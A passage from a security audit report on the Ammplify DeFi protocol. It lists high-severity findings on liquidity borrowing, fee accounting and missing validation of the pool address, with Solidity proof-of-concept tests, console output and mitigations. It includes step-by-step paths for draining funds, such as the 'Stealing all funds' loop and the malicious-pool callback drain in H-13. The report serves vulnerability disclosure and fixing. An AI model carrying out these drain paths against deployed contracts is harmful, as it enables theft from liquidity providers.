Pre-conditions\r\nTaker has taken some liquidity, where maker can reduce liquidity so that it borrows from parent\r\n\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\nIncorrect accounting and portfolio of uniswap liquidity positions, happens by itself\r\nHappens almost any time liquidity has to be borrowed.\r\nExample:\r\n\r\nUser has 100e18 maker liquidity in 480..960 range\r\nTaker takes 100e18 liquidity in the 720..960 range\r\nSince there is not enough liquidity available in the 720..960 range, it is borrowed from the 480..960 range\r\n100e18 of 480..960 liquidity is burned\r\n100e18 worth of 720..960 liquidity is given to taker\r\nNotice, 480..720 liquidity is not minted. So the Ammplify now owes 100e18 liquidity in the 480..960 range, but has 0 uniswap positions, taker owes Ammplify 100e18 liquidity in the 720..960 range and Ammplify has current asset distribution from the 100e18 liquidity of the 480..720 range. Once liquidity is repaid back, Ammplify might be insolvent and unable to mint 480..960 liquidity to repay to the user, because it will have a different tokens distribution from the required one, and won't have fees which uniswap position earned.\r\n\r\nStealing all funds\r\nExample:\r\n\r\nCurrent price is 500\r\nAttacker has 300e18 maker liquidity in the 720..960 range\r\nTaker takes 100e18 of liquidity in the 720..960 range\r\nAttacker adds 100e18 liquidity in the 480..960 range\r\nAttacker adds 100e18 liquidity in the 480..720 range\r\nAttacker removes 300e18 liquidity from the 720..960 range. This node borrows 100e18 liquidity from 480..960 node. Note, node 480..720 has still 100e18 uniswap liquidity after this operation, instead of 200e18\r\nAttacker manipulates uniswap current price to 720\r\nAttacker removes 100e18 liquidity from the 480..960 range. This gives attacker token1 in the value higher than at current price of 500 without minting or burning uniswap liquidity (Ammplify's node liquidity = 100e18(maker) + (preBorrow)100e18 - 100e18(maker removal) = 100e18, so not modified)\r\nAttacker manipulates uniswap current price back to 500\r\nThis can be repeated many times with each loop bringing attacker profit (he mints 100e18 liquidity at current price of 500, then burns it at inflated price of 720). Eventually all Ammplify balance is stolen. Since it can be done multiple times in 1 transaction, this should require just a few transactions, if not just one (if taker liquidity is large enough).\r\n\r\nImpact\r\nIncorrect portfolio of uniswap positions which can lead to protocol insolvency due to unearned fees and incorrect tokens composition\r\nAttacker can steal all protocol funds (takers collateral and collected fees not yet claimed or compounded)\r\nProof of concept\r\nAdd this test to Taker.t.sol:\r\n\r\nimport { Key, KeyImpl } from \"../../src/tree/Key.sol\";  \r\nimport { Node } from \"../../src/walkers/Node.sol\";  \r\nimport { LiqNode } from \"../../src/walkers/Liq.sol\";  \r\n...  \r\n    function net(LiqNode memory self) internal returns (int128) {  \r\n        return int128(self.borrowed + self.mLiq) - int128(self.tLiq + self.lent);  \r\n    }  \r\n  \r\n    function testBorrowIncorrect() public {  \r\n        bytes memory rftData = \"\";  \r\n  \r\n        // Collateralize before creating taker position  \r\n        _collateralizeTaker(recipient, liquidity);  \r\n  \r\n        // set some liquidity to avoid the other bugs causing reverts  \r\n        addPoolLiq(0, 480, 960, 1);  \r\n        addPoolLiq(0, 480, 720, 1);  \r\n        addPoolLiq(0, 720, 960, 1);  \r\n  \r\n        // set price inside the range  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(840));  \r\n  \r\n        // First create a maker large enough to borrow from.  \r\n        uint256 makerAssetId = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            720,  \r\n            960,  \r\n            300e18,  \r\n            true,  \r\n            sqrtPriceLimitsX96[0],  \r\n            sqrtPriceLimitsX96[1],  \r\n            rftData  \r\n        );  \r\n  \r\n        ticks[0] = 720;  \r\n        ticks[1] = 960;  \r\n  \r\n        // taker takes some of the liquidity  \r\n        uint256 takerAssetId = takerFacet.newTaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            ticks,  \r\n            100e18,  \r\n            vaultIndices,  \r\n            sqrtPriceLimitsX96,  \r\n            79228162514264337593543950336, // tick 840  \r\n            rftData  \r\n        );  \r\n  \r\n        // now attacker can manipulate a new large mint  \r\n        // provide liquidity in a much large range  \r\n        uint256 makerAssetId2 = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            480,  \r\n            960,  \r\n            100e18,  \r\n            true,  \r\n            sqrtPriceLimitsX96[0],  \r\n            sqrtPriceLimitsX96[1],  \r\n            rftData  \r\n        );  \r\n  \r\n        // check the liquidity in all ranges  \r\n        uint24 tree480 = poolInfo.treeTick(480);  \r\n        uint24 tree720 = poolInfo.treeTick(720);  \r\n        Key[] memory keys = new Key[](3);  \r\n        keys[0] = KeyImpl.make(tree480, 4); // 480..720 range  \r\n        keys[1] = KeyImpl.make(tree480, 8); // 480..960 range  \r\n        keys[2] = KeyImpl.make(tree720, 4); // 720..960 range  \r\n        Node[] memory nodes = viewFacet.getNodes(poolAddr, keys);  \r\n        console.log(\"480..720 liquidity = \", net(nodes[0].liq) / 1e18);  \r\n        console.log(\"480..960 liquidity = \", net(nodes[1].liq) / 1e18);  \r\n        console.log(\"720..960 liquidity = \", net(nodes[2].liq) / 1e18);  \r\n  \r\n        // remove liquidity in the range where it was taken  \r\n        makerFacet.adjustMaker(recipient, makerAssetId, 1e18, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);  \r\n  \r\n        nodes = viewFacet.getNodes(poolAddr, keys);  \r\n        console.log(\"after removing 199 in [720..960]:\");  \r\n        console.log(\"480..720 liquidity = \", net(nodes[0].liq) / 1e18);  \r\n        console.log(\"480..960 liquidity = \", net(nodes[1].liq) / 1e18);  \r\n        console.log(\"720..960 liquidity = \", net(nodes[2].liq) / 1e18);  \r\n    }  \r\nConsole output from running the test:\r\n\r\n  480..720 liquidity =  0  \r\n  480..960 liquidity =  100  \r\n  720..960 liquidity =  200  \r\n  after removing 299 in [720..960]:  \r\n  480..720 liquidity =  0  \r\n  480..960 liquidity =  1  \r\n  720..960 liquidity =  0  \r\nNote that after removing 299 liquidity in the 720..960 range there is just 1 liquidity remaining in 480..960 range and no liquidity in the 480..720 range.\r\n\r\nMitigation\r\nPossible solution is to use 2 passes in the pool settlement phase:\r\n\r\nSame as now\r\nAnother pass on a modified route, which includes all siblings (so traverses always 2 sibling nodes at each width before going to parent). In this pass only apply preBorrow / preLend and mint/burn uniswap liquidity as needed.\r\nThis can actually be more complicated due to liquidity modified in the 2nd phase which can influence the other things. So possibly a more correct solution can include 2 passes in the liquidity modification phase and including both siblings in all routes.\r\n\r\nIssue H-10: Takers can pay significantly less fees with makers losing these amounts due to subtreeBorrowedX and subtreeBorrowedY being node's values instead of subtree's\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/426\r\n\r\nFound by\r\n0x37, BoyD, anonymousjoe, maigadoh, panprog\r\n\r\nSummary\r\nWhen takers pay their fees, the base borrowed amount which is multiplied by the borrowing rate is calculated as:\r\n\r\n        (uint256 totalXBorrows, uint256 totalYBorrows) = data.computeBorrows(key, data.liq.tLiqPrefix, true);  \r\n        totalXBorrows += node.liq.subtreeBorrowedX;   \r\n        totalYBorrows += node.liq.subtreeBorrowedY;  \r\n        uint256 colXPaid = FullMath.mulX64(totalXBorrows, takerRateX64, true);  \r\n        uint256 colYPaid = FullMath.mulX64(totalYBorrows, takerRateX64, true);  \r\nThe issue is that the calculations assume that node.liq.subtreeBorrowedX (and Y) are subtree's total borrowed values, while, in fact, this is the node's value only, it doesn't include node's children values. It is changed in Liquidity up walker and nowhere else:\r\n\r\n            if (sliq < targetLiq) {  \r\n                uint128 liqDiff = targetLiq - sliq;  \r\n                node.liq.tLiq += liqDiff;  \r\n                node.liq.subtreeTLiq += iter.width * liqDiff;  \r\n                // The borrow is used to calculate payments amounts and we don't want that to fluctuate  \r\n                // with price or else the fees become too unpredictable.  \r\n                (uint256 xBorrow, uint256 yBorrow) = data.computeBorrows(iter.key, liqDiff, true);  \r\n                node.liq.subtreeBorrowedX += xBorrow;  \r\n                node.liq.subtreeBorrowedY += yBorrow;  \r\nSimilar node.liq.subtreeTLiq is updated from the children in the liquidity walker up function:\r\n\r\n        if (visit) {  \r\n            modify(iter, node, data, data.liq.liq);  \r\n        } else {  \r\n            // If propogating, we can't be at a leaf.  \r\n            (Key lk, Key rk) = key.children();  \r\n            Node storage lNode = data.node(lk);  \r\n            Node storage rNode = data.node(rk);  \r\n            node.liq.subtreeMLiq = lNode.liq.subtreeMLiq + rNode.liq.subtreeMLiq + node.liq.mLiq * iter.width;  \r\n            node.liq.subtreeTLiq = lNode.liq.subtreeTLiq + rNode.liq.subtreeTLiq + node.liq.tLiq * iter.width;  \r\n        }  \r\nBut the subtreeBorrowedX (Y) is not propogating the same way, so it stays node's value only.\r\n\r\nThis leads to significant undercalculation of fees paid from takers to makers. For example:\r\n\r\nThere is 1e18 liquidity taken at the 0..245760 range (yBorrowed = 418e18)\r\nThere is 1000e18 liquidity taken at the 0..122880 range (yBorrowed = 20561e18)\r\nThe rate to be charged is 100%\r\nDepending on the range which is updated first (for example, which range will makers collect fees from first):\r\n\r\nIf maker collects in the 0..245760 range, totalYBorrowed = 418 (20561 amount is ignored because it's not included in the node's subtreeBorrowedY), amount charged = 418 * 100% = 418, 1/1000 of it (0.418) is charged to this node and 417.5 is propogated to the 0..122880 node. Total charged = 418.\r\nIf maker collects in the 0..122880 range, totalYBorrowed = borrowed(prefix) + node.liq.subtreeBorrowedY = 418*0.5 + 20561 = 20770, amount charged = 20770 * 100% = 20770\r\nSo depending on what range is updated first, the total fees charged can be 98% less than it should be.\r\n\r\nRoot Cause\r\nThe only time node.liq.subtreeBorrowedX (Y) is updated is when modifying node's taker liquidity, with no propogation happening anywhere:\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Liq.sol#L326-L327\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Liq.sol#L337-L338\r\n\r\nInternal Pre-conditions\r\nNone.\r\n\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\nHappens by itself most of the time:\r\n\r\nAny time a node is updated, taker fees rate is charged on the amount of prefix (all nodes above the node being updated) and the amount of the node which is being updated, all nodes below it are ignored.\r\nIt's also possible for malicious Taker to keep updating the top-most range with tiny taker liquidity taken, keeping taker fees at extremely low rate even if all liquidity is taken.\r\n\r\nImpact\r\nMakers getting up to 99% less fees from takers than they should. Realistically, when happenning by itself, about 50% of fees will be lost by Makers (and Takers will pay 50% less fees).\r\n\r\nProof of concept\r\nAdd this test to Taker.t.sol:\r\n\r\n    // since node.liq.subtreeBorrowedX is not really subtree, but rather just this node's borrowed X (Y),  \r\n    // this test demonstrates the effect of it by taking small liquidity with large width and big liquidity with  \r\n    // smaller width, which is 2 levels below the small liquidity. Updating anything at the large width level  \r\n    // will only charge taker fees on small liquidity amount, ignoring the large liquidity amount, which will pay 0 fees  \r\n    function testReducedBorrowRate() public {  \r\n        bytes memory rftData = \"\";  \r\n  \r\n        // Collateralize before creating taker position  \r\n        _collateralizeTaker(recipient, liquidity);  \r\n  \r\n        // add some liquidity to avoid revert due to the other bugs  \r\n        addPoolLiq(0, 0, 245760, 1);  \r\n        addPoolLiq(0, 61440, 122880, 1);  \r\n  \r\n        // current price inside the range  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(120000));  \r\n  \r\n        // create a maker at the large width with small liquidity  \r\n        uint256 makerAssetId = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            0,  \r\n            245760,  \r\n            1e18,   \r\n            false,  \r\n            sqrtPriceLimitsX96[0],  \r\n            sqrtPriceLimitsX96[1],  \r\n            rftData  \r\n        );  \r\n  \r\n        // create a maker 2 levels below previous with large liquidity  \r\n        uint256 makerAssetId2 = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            0,  \r\n            122880,  \r\n            1000e18,  \r\n            false,  \r\n            sqrtPriceLimitsX96[0],  \r\n            sqrtPriceLimitsX96[1],  \r\n            rftData  \r\n        );  \r\n  \r\n        ticks[0] = 0;  \r\n        ticks[1] = 245760;  \r\n  \r\n        // taker takes small liquidity  \r\n        uint balance0Before = token0.balanceOf(address(this));  \r\n        uint balance1Before = token1.balanceOf(address(this));  \r\n        uint256 takerAssetId = takerFacet.newTaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            ticks,  \r\n            9e17,  \r\n            vaultIndices,  \r\n            sqrtPriceLimitsX96,  \r\n            31928949493248528050198211985408, // sqrt price at tick 120000  \r\n            rftData  \r\n        );  \r\n        console.log(\"small liquidity delta0: \", int(token0.balanceOf(address(this))) - int(balance0Before));  \r\n        console.log(\"small liquidity delta1: \", int(token1.balanceOf(address(this))) - int(balance1Before));  \r\n  \r\n        ticks[0] = 0;  \r\n        ticks[1] = 122880;  \r\n  \r\n        // taker takes large liquidity  \r\n        balance0Before = token0.balanceOf(address(this));  \r\n        balance1Before = token1.balanceOf(address(this));  \r\n        uint256 takerAssetId2 = takerFacet.newTaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            ticks,  \r\n            999e18,  \r\n            vaultIndices,  \r\n            sqrtPriceLimitsX96,  \r\n            31928949493248528050198211985408, // sqrt price at tick 120000  \r\n            rftData  \r\n        );  \r\n        console.log(\"large liquidity delta0: \", int(token0.balanceOf(address(this))) - int(balance0Before));  \r\n        console.log(\"large liquidity delta1: \", int(token1.balanceOf(address(this))) - int(balance1Before));  \r\n  \r\n        // skip 1 day (the default rates setup in test config are huge, so 1 day is over 100%)  \r\n        vm.roll(1);  \r\n        skip(86400);  \r\n  \r\n        // \"touch\" large width by collecting fees, this will charge fees only from 9e17 liquidity  \r\n        //makerFacet.collectFees(recipient, makerAssetId, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);  \r\n  \r\n        // depending on which range is updated first, the fees charged will differ dramatically  \r\n        int balance0;  \r\n        int balance1;  \r\n        (,, balance0, balance1) = takerFacet.removeTaker(takerAssetId, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);  \r\n        console.log(\"small liquidity return delta0: \", balance0);  \r\n        console.log(\"small liquidity return delta1: \", balance1);  \r\n        (,, balance0, balance1) = takerFacet.removeTaker(takerAssetId2, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);  \r\n        console.log(\"large liquidity return delta0: \", balance0);  \r\n        console.log(\"large liquidity return delta1: \", balance1);  \r\n    }  \r\nConsole output from running the test:\r\n\r\n  small liquidity delta0:  -1704342488049  \r\n  small liquidity delta1:  277011965446689000  \r\n  large liquidity delta0:  -1891820161733437  \r\n  large liquidity delta1:  307483281645824790886  \r\n  small liquidity return delta0:  -67788456300445  \r\n  small liquidity return delta1:  -15352923623904726587  \r\n  large liquidity return delta0:  -75245186493492955  \r\n  large liquidity return delta1:  -17041745222534246510996  \r\nNow if we swap the order in which taker liquidity is taken, it shouldn't change the amounts charged (since it happens in the same block), but the amount of fees charged changes dramatically:\r\n\r\n        (,, balance0, balance1) = takerFacet.removeTaker(takerAssetId2, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);  \r\n        console.log(\"large liquidity return delta0: \", balance0);  \r\n        console.log(\"large liquidity return delta1: \", balance1);  \r\n        (,, balance0, balance1) = takerFacet.removeTaker(takerAssetId, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);  \r\n        console.log(\"small liquidity return delta0: \", balance0);  \r\n        console.log(\"small liquidity return delta1: \", balance1);  \r\nConsole output:\r\n\r\n  small liquidity delta0:  -1704342488049  \r\n  small liquidity delta1:  277011965446689000  \r\n  large liquidity delta0:  -1891820161733437  \r\n  large liquidity delta1:  307483281645824790886  \r\n  large liquidity return delta0:  -1769220979907580729108  \r\n  large liquidity return delta1:  -824359137522368829210445  \r\n  small liquidity return delta0:  -798386402728674408  \r\n  small liquidity return delta1:  -145964216100097777846220  \r\nNote that when larger range is updated first:\r\n\r\nlarge liquidity pays token0: 0.07e18, token1: 17041e18\r\nsmall liquidity pays token0: 0.00007e18, token1: 0.27e18\r\nIf smaller range is updated first (this is also the correct amount of fee that should be charged):\r\n\r\nlarge liquidity pays token0: 1769e18, token1: 824359e18\r\nsmall liquidity pays token0: 0.8e18, token1: 145964e18\r\nMitigation\r\nSimilar to subtreeMLiq and subtreeTLiq, keep track of node's ownBorrowX(Y) and update subtreeBorrowX(Y) from ownBorrow and children's subtreeBorrow.\r\n\r\nIssue H-11: Takers pay significantly higher fees than expected due to borrow amounts being split across segments\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/452\r\n\r\nFound by\r\npanprog\r\n\r\nSummary\r\nWhen takers pay their fees, they pay their taker rate using the amounts of token0 and token1 based on the geometric mean price of the interval (in Data.computeBorrows):\r\n\r\n        int24 gmTick = lowTick + (highTick - lowTick) / 2; // The tick of the geometric mean.  \r\nFor example, if there is 1e18 taker liquidity in the [-122880..245760] range, the borrow amounts for this interval should be:\r\n\r\nborrowX = 0.046e18\r\nborrowY = 21.6e18\r\nThe issue is that since a segment tree is used to store taker liquidity, internally it's broken into 2 segments, and the amounts of token0 and token1 are calculated based on the geometric mean of each segment rather than original price, which inflates borrow amounts a lot:\r\n\r\nfor [-122880..0]: borrowX = 20.6e18, borrowY = 0.044e18\r\nfor [0..245760]: borrowX = 0.00214e18, borrowY = 464.7e18\r\nThe sum of these borrow amounts is: borrowX = 20.6e18, borrowY = 464.8e18. It is at least 200x times more than the expected borrow amount.\r\nWith a 10% taker rate, taker expects to pay 0.0046e18 token0 and 2.16e18 token1. However, due to how the liquidity is stored and calculated, the taker will pay 2.06e18 token0 and 46.48e18 token1.\r\n\r\nNote: there is a similar-sounding issue reported, but it's quite different from this one. This one concerns the way the taker liquidity is stored in the segment tree (i.e. it's impossible to recognize what the original range was after it's split into nodes), while the other issue is about the way the borrow amounts are propogated inside the tree during calculation. The root cause, code part and fix are different for these issues.\r\n\r\nRoot Cause\r\nThe taker liquidity is stored in separate nodes with base borrow amounts calculated as sum of borrow amounts of all nodes:\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Liq.sol#L323-L327\r\n\r\nSince a borrow amount of each segment is calculated at geometric mean of the segment, sum of subsegment borrow amounts is always greater than borrow amount of the parent segment.\r\n\r\nInternal Pre-conditions\r\nNone.\r\n\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\nHappens by itself almost always (except when taker liquidity is perfectly alligned inside single node):\r\n\r\nAny time taker fees are charged, the borrow base amount is greater than expected\r\nImpact\r\nTakers are charged fees which are much larger than they expect (up to 1000x more, but the actual amounts depends on taker range width and the alignment of the range over the segment tree nodes).\r\n\r\nProof of concept\r\nThis test demonstrates that taker fees can be hugely different when the range is very similar, but one range fits within 1 node, while the other takes multiple nodes.\r\nAdd this test to Taker.t.sol:\r\n\r\n    // the test to demonstrate borrowX / borrowY amounts calculated from 1 range  \r\n    // are much smaller than sum of borrowX / borrowY from multiple sub-segments of the same range  \r\n    function testBorrowRange() public {  \r\n        ticks[0] = 60;  \r\n        ticks[1] = 61500;  \r\n  \r\n        bytes memory rftData = \"\";  \r\n  \r\n        // Collateralize before creating taker position  \r\n        _collateralizeTaker(recipient, liquidity);  \r\n  \r\n        // add some liquidity to avoid revert due to the other bugs  \r\n        addPoolLiq(0, 0, 61440, 1);  \r\n        addPoolLiq(0, 61440, 61500, 1);  \r\n        addPoolLiq(0, 60, 61500, 1);  \r\n        addPoolLiq(0, 30720, 61440, 1);  \r\n        addPoolLiq(0, 15360, 30720, 1);  \r\n        addPoolLiq(0, 7680, 15360, 1);  \r\n        addPoolLiq(0, 3840, 7680, 1);  \r\n        addPoolLiq(0, 1920, 3840, 1);  \r\n        addPoolLiq(0, 960, 1920, 1);  \r\n        addPoolLiq(0, 480, 960, 1);  \r\n        addPoolLiq(0, 240, 480, 1);  \r\n        addPoolLiq(0, 120, 240, 1);  \r\n        addPoolLiq(0, 60, 120, 1);  \r\n  \r\n        // current price inside the range  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(30000));  \r\n  \r\n        // create a maker  \r\n        uint256 makerAssetId = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            ticks[0],  \r\n            ticks[1],  \r\n            1000e18,   \r\n            false,  \r\n            sqrtPriceLimitsX96[0],  \r\n            sqrtPriceLimitsX96[1],  \r\n            rftData  \r\n        );  \r\n  \r\n        // taker  \r\n        uint balance0Before = token0.balanceOf(address(this));  \r\n        uint balance1Before = token1.balanceOf(address(this));  \r\n        uint256 takerAssetId = takerFacet.newTaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            ticks,  \r\n            100e18,  \r\n            vaultIndices,  \r\n            sqrtPriceLimitsX96,  \r\n            316912650057057350374175801344, // sqrt price at tick 30000  \r\n            rftData  \r\n        );  \r\n  \r\n        // skip 1 day (the default rates setup in test config are huge, so 1 day is over 100%)  \r\n        vm.roll(1);  \r\n        skip(86400);  \r\n  \r\n        // close taker  \r\n        int balance0;  \r\n        int balance1;  \r\n        (,, balance0, balance1) = takerFacet.removeTaker(takerAssetId, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);  \r\n        console.log(\"taker delta0: \", int(token0.balanceOf(address(this))) - int(balance0Before));  \r\n        console.log(\"taker delta1: \", int(token1.balanceOf(address(this))) - int(balance1Before));  \r\n    }  \r\nConsole output from running the test for different ranges:\r\n\r\n  Range: [0..61440]  \r\n  taker delta0:  -103656284008960492872  \r\n  taker delta1:  -2237080338801346043575  \r\n  \r\n  Range: [60..61500]  \r\n  taker delta0:  -6872773555155430359929  \r\n  taker delta1:  -38030987209605234027252  \r\nNote:\r\n\r\nThe range [0..61440] fits within one segment tree node, thus it has correct taker fee of 103e18 token0 and 2237e18 token1\r\nThe range [60..61500] is very similar to previous range, so the taker fee should be very similar, but since it's broken down into many segments (60..120, 120..240, 240..480, ..., 15360..30720, 30720..61440, 61440..61500), the total borrow amounts are greater and total taker fee is 6872e18 token0 and 38030e18 token1, at least 17x times greater than [0..61440] segment taker fees.\r\nMitigation\r\nThis is hard to fix and is the core protocol design, so depends on the developer intentions. One possible solution is to calculate the borrowX and borrowY for the liquidity deposited in its full range, then split these amounts into nodes according to the node width.\r\n\r\nIssue H-12: Missing width scaling in FeeWalker.up (non-visited) undercredits compounding maker fees\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/465\r\n\r\nFound by\r\n0xnija, SOPROBRO, anonymousjoe, blockace, globalace, hjo, holtzzx, maigadoh, neeloy, panprog, thimthor, x15\r\n\r\nSummary\r\nIn FeeWalker.up when visit == false, the code credits compounding maker fees using compoundingLiq = mLiq - ncLiq without multiplying by key.width(), while the per-column rate denominator (totalMLiq) includes width scaling. This undercredits compounding makers on non-visited nodes compared to the visited path which correctly uses width * (mLiq - ncLiq).\r\n\r\nRoot Cause\r\nInconsistent units—column rates are per column-liquidity (width-scaled), but the applied compounding quantity in the non-visited path is not width-scaled.\r\n\r\nLink (non-visited path):\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Fee.sol#L249-L267\r\n\r\n// We charge/pay our own fees.  \r\nnode.fees.takerXFeesPerLiqX128 += colTakerXRateX128;  \r\nnode.fees.takerYFeesPerLiqX128 += colTakerYRateX128;  \r\nnode.fees.makerXFeesPerLiqX128 += colMakerXRateX128;  \r\nnode.fees.makerYFeesPerLiqX128 += colMakerYRateX128;  \r\n// We round down to avoid overpaying dust.  \r\nuint256 compoundingLiq = node.liq.mLiq - node.liq.ncLiq; // vulnerable: missing * key.width()  \r\nnode.fees.xCFees = add128Fees(  \r\n    node.fees.xCFees,  \r\n    FullMath.mulX128(colMakerXRateX128, compoundingLiq, false),  \r\n    data,  \r\n    true  \r\n);  \r\nnode.fees.yCFees = add128Fees(  \r\n    node.fees.yCFees,  \r\n    FullMath.mulX128(colMakerYRateX128, compoundingLiq, false),  \r\n    data,  \r\n    false  \r\n);  \r\nContrast (visited path correct):\r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Fee.sol#L418-L424\r\n\r\nuint256 compoundingLiq = width * (node.liq.mLiq - node.liq.ncLiq);  \r\nnode.fees.xCFees = add128Fees(  \r\n    node.fees.xCFees,  \r\n    FullMath.mulX128(colMakerXRateX128, compoundingLiq, false),  \r\n    data,  \r\n    true  \r\n);  \r\nAttack Path\r\nUndercredited compounding makers at non-visited nodes\r\n\r\nProvide compounding maker liquidity such that the node is charged in the propagation (non-visited) path (common during walks up ancestors where visit == false).\r\nTrigger walks frequently; accrued compounding fees into xCFees/yCFees are undercounted due to missing width multiplier.\r\nNo downstream normalization exists; xCFees/yCFees are later used directly for earnings and compounding.\r\nImpact\r\nMakers are underpaid on non-visited nodes; compounding growth is reduced. The shortfall scales with node width (e.g., width=8 → ~87.5% undercredit for that node’s compounding portion), causing material loss of user yield and future principal via compounding.\r\nMitigation\r\nMultiply by width in the non-visited path to match visited-path logic:\r\nuint256 compoundingLiq = uint256(key.width()) * (node.liq.mLiq - node.liq.ncLiq);\r\nIssue H-13: Attackers can drain the protocol tokens\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/566\r\n\r\nFound by\r\n0x37, 0xBanku, 0xnija, 0xpinkman, EtherEngineer, KiroBrejka, Meta_Bug, P00, SanketKogekar, TheSavageTeddy, XDZIBEC, Ziusz, anonymousjoe, blockace, har0507, m4ze, neeloy, panprog, serenity1337, t.aksoy, vivekd, vtim\r\n\r\nSummary\r\nThere is no verification of the pool address passed by makers. This allows users to pass malicious pool address to the newMaker() function, and steal all the tokens present in the contract via calling the uniswapV3MintCallback function. This causes all the fees (of non-compound makers, JIT Penalties and the xCFees yCFees to be stolen).\r\n\r\nRoot Cause\r\nNot verifying that the pool is a valid uniswap v3 pool, allows the user to pass any address as the pool address. Then the malicious contract can call back the maker contract with huge negative values as the parameters in the uniswapV3MintCallback.\r\n\r\nInternal Pre-conditions\r\nNone.\r\n\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\n        require(liq >= MIN_MAKER_LIQUIDITY, DeMinimusMaker(liq));  \r\n        PoolInfo memory pInfo = PoolLib.getPoolInfo(poolAddr);  \r\n        (Asset storage asset, uint256 assetId) = AssetLib.newMaker(  \r\n            recipient,  \r\n            pInfo,  \r\n            lowTick,  \r\n            highTick,  \r\n            liq,  \r\n            isCompounding  \r\n        );  \r\n        Data memory data = DataImpl.make(pInfo, asset, minSqrtPriceX96, maxSqrtPriceX96, liq);  \r\n        // This fills in the nodes in the asset.  \r\n        WalkerLib.modify(pInfo, lowTick, highTick, data);  \r\n        // Settle balances.  \r\n        address[] memory tokens = pInfo.tokens();  \r\n        int256[] memory balances = new int256[](2);  \r\n        balances[0] = data.xBalance;  \r\n        balances[1] = data.yBalance;  \r\n        RFTLib.settle(msg.sender, tokens, balances, rftData);  \r\n        PoolWalker.settle(pInfo, lowTick, highTick, data);  // <= calls the PoolWalker.settle => PoolWalker.updateLiq => PoolLib.mint()  \r\n        return assetId;  \r\n    }  \r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/facets/Maker.sol#L31-L52\r\n\r\nUser calls the newMaker() function with a malicious contract address (that he created)\r\nThe initial pool calls such as the ones in PoolLib.getPoolInfo() will return normal values\r\nFurther the position is created, and the nodes updated.\r\nDuring the RFTLib.settle, the user pays a small amount to the protocol. (as calculated by the tree traversal)\r\nIn the PoolWalker.settle function, the contract walks to the dirty nodes and calls the updateLiq function which calls the PoolLib.mint() function\r\nThis adds the malicious pool address in the POOL_GUARD_SLOT, and calls the mint() function of the pool\r\n    function mint(  \r\n        address pool,  \r\n        int24 tickLower,  \r\n        int24 tickUpper,  \r\n        uint128 liquidity  \r\n    ) internal returns (uint256 amount0, uint256 amount1) {  \r\n        POOL_GUARD_SLOT.asAddress().tstore(pool);  \r\n        (amount0, amount1) = IUniswapV3Pool(pool).mint(address(this), tickLower, tickUpper, liquidity, \"\");  \r\n        POOL_GUARD_SLOT.asAddress().tstore(address(0));  \r\n    }  \r\nThe user's malicious pool can now give the entire balance of the protocol as the parameters in the uniswapV3MintCallback function\r\nThis will cause the protocol to transfer the entire balance to the pool contract.\r\n    function uniswapV3MintCallback(uint256 amount0Owed, uint256 amount1Owed, bytes calldata) external {  \r\n        address activeMint = PoolLib.poolGuard();  \r\n        require(msg.sender == activeMint, UnauthorizedMint(activeMint, msg.sender));  \r\n        PoolInfo memory pInfo = PoolLib.getPoolInfo(activeMint);  \r\n        TransferHelper.safeTransfer(pInfo.token0, activeMint, amount0Owed);  \r\n        TransferHelper.safeTransfer(pInfo.token1, activeMint, amount1Owed);  \r\n    }  \r\nhttps://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/facets/Pool.sol#L16-L22\r\n\r\nImpact\r\nTheft of user fees, JIT penalties and in some cases their principal liquidity tokens too. (In certain cases, the liquidity is not instantly minted so it remains in the contract which can now be stolen).\r\n\r\nPoC\r\nNo response\r\n\r\nMitigation\r\nVerify that the inputted pool address is a valid uniswap v3 pool created by uniswap v3 factory.\r\n\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/43\r\n\r\nIssue M-1: DoS of pool if uniswapV3MintCallback's tokenAmountOwed is 0 for a Revert on Zero Value Transfers token.\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/2\r\n\r\nFound by\r\nADM_, axelot, maigadoh\r\n\r\nSummary\r\nThe Readme states that Revert on Zero Value Transfers are expected to work with the protocol, however as there is no amount > 0 check when transferring tokens in PoolFacet.sol#uniswapV3MintCallback() so the function will revert if amountOwed == 0 for the Revert on Zero Value Transfers token.\r\nThis will DoS all Maker functions & the newTaker/removeTaker functions in the affected tick range as the callback needs to succeed for the PoolWalker.sol#settle() 